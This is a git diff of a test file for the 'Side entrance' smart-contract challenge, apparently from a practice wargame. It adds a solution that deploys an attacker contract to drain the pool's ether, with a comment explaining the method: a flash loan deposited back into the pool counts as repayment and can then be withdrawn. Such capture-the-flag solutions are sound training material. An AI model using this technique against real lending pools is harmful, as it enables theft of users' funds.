@@ -25,7 +25,13 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /* 
+            We will use a proxy contract to take the loan and deposit those funds inside the pool (this counts as repaying it too).
+            This will let us withdraw those funds after and sending them to player (bcs the loan was used to add our balance inside pool).
+
+        */
+        const AttackSideEntranceFactory = await ethers.getContractFactory('AttackSideEntrance', player);
+        await (await AttackSideEntranceFactory.deploy(pool.address)).attack(ETHER_IN_POOL);
     });
 
     after(async function () {
